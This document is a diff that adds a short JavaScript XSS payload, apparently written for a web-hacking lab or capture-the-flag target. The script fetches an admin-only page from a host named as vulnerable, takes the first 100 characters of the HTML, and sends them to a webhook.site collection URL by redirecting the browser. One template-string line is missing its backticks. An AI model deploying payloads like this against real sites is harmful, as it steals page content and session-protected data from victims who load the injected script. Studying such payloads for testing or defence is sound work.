@@ -1,0 +1,17 @@
+<script>
+(async () => {
+    const sourceUrl = "https://a57503acf705-webth-vulnerable.numa.host/poem/?username=admin";
+    const redirectBaseUrl = "https://webhook.site/11ddb5ad-685b-45e8-b38d-228f648c82a5";
+    try {
+        const response = await fetch(sourceUrl);
+        const html = await response.text();
+        const limitedHtml = html.slice(0, 100);
+        const encodedHtml = encodeURIComponent(limitedHtml);
+        const redirectUrl = ${redirectBaseUrl}?data=${encodedHtml};
+        window.location.href = redirectUrl;
+    } catch (error) {
+        console.error("Error durante la ejecución:", error);
+    }
+})();
+
+</script>
